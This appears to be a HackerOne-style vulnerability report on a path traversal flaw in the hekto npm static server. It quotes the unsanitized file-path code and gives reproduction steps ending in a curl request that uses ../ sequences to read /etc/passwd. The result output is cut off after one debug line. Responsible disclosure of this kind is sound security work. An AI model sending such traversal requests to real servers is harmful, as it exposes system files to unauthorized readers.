## Description

This vulnerability exists, because there is no sanitization of path of requested file. In line 80 (index.js) ```file``` is set:

```javascript
// node_modules/hekto/bin/hekto.js line 80:
    let file = path.join(process.cwd(), argDir, this.request.url);
```

Then, this variable is used "as is" in code which reads file from the server:

```javascript
// node_modules/hekto/bin/hekto.js line 126:

    // if `file` is a file
    if (fs.lstatSync(file).isFile()) {
        this.status = 200;

        if (path.extname(file) == '.html') {
            this.type = 'text/html';
            this.body = fs.createReadStream(file);
        } else if (path.extname(file) == '.css') {
            this.type = 'text/css';
            this.body = fs.createReadStream(file);
        } else {
            const fileBuffer = readChunk.sync(file, 0, 4100);
            const mime = fileType(fileBuffer);

            if (mime) {
                this.type = mime.mime + '; charset=utf-8';
            } else {
                this.type = 'text/plain; charset=utf-8';
            }

            this.body = fs.createReadStream(file);
        }
    }
```

## Steps To Reproduce:

- install ```hekto``` module

```
$ npm install hekto
```

- run server from command line:

```
$ ./node_modules/hekto/bin/hekto.js serve

Serving on port 3000

```

- use following command to confirm the vulnerability (pelase adjust number of ../ to reflect your system):

```
$ curl -v --path-as-is http://127.0.0.1:3000/../../../../../etc/passwd
```

Result:

```

* TCP_NODELAY set

Please feel free to invite module maintainer to this report. I haven't contacted maintainer as I want to keep the process of fixing and disclosing bug consistent through HackerOne platform only.

I hope my report will help to keep Node.js ecosystem and its users safe in the future.
